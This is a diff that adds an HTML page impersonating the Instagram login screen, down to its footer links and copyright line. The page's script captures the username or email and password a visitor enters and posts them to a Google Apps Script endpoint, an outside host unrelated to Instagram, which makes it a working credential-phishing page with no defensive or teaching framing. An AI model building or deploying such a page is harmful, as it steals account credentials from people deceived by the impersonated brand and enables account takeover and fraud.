@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="styles-login.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <h1>Instagram</h1>
+            <form id="login-form">
+                <input type="text" name="username_or_email" placeholder="Phone number, username, or email" required>
+                <div class="password-container">
+                    <input type="password" name="password" placeholder="Password" id="password" required>
+                    <span class="toggle-password" onclick="togglePassword()">👁️</span>
+                </div>
+                <button type="submit">Log In</button>
+            </form>
+            <div class="divider">OR</div>
+            <button class="facebook-login" onclick="window.location.href='facebook-login.html'">Log in with Facebook</button>
+            <p>Don't have an account? <a href="signup.html">Sign up</a></p>
+        </div>
+        <div class="download-app">
+            <p>Get the app.</p>
+            <div class="app-links">
+                <img src="play-store.png" alt="Play Store" class="app-logo">
+                <img src="microsoft-store.png" alt="Microsoft Store" class="app-logo">
+            </div>
+        </div>
+    </div>
+    <footer>
+        <ul class="footer-links">
+            <li><a href="#">Meta</a></li>
+            <li><a href="#">About</a></li>
+            <li><a href="#">Blog</a></li>
+            <li><a href="#">Jobs</a></li>
+            <li><a href="#">Help</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">Privacy</a></li>
+            <li><a href="#">Terms</a></li>
+            <li><a href="#">Locations</a></li>
+            <li><a href="#">Instagram Lite</a></li>
+            <li><a href="#">Threads</a></li>
+            <li><a href="#">Contact Uploading & Non-Users</a></li>
+            <li><a href="#">Meta Verified</a></li>
+        </ul>
+        <p class="footer-info">English · © 2025 Instagram from Meta</p>
+    </footer>
+    <script>
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            const type = passwordField.type === 'password' ? 'text' : 'password';
+            passwordField.type = type;
+        }
+
+    document.getElementById("login-form").addEventListener("submit", async function(event) { 
+        event.preventDefault(); // Prevent page reload
+        
+        let formData = new FormData(this);
+        let url = "https://script.google.com/macros/s/AKfycbxVvwslr7AVfwIgiG4JFS1C08Hlz-2e3CUjMKMSavi0tloeEwNosw-03ZuGaufq_vEY/exec";
+
+        try {
+            let response = await fetch(url, {
+                method: "POST",
+                body: formData  // Send form data directly
+            });
+
+            let result = await response.json(); // Expect JSON response from Google Apps Script
+            alert(result.message);  // Show success or error message
+            this.reset();
+        } catch (error) {
+            alert("Error: " + error.message);
+        }
+    });
+</script>
+
+
+    </script>
+</body>
+</html>
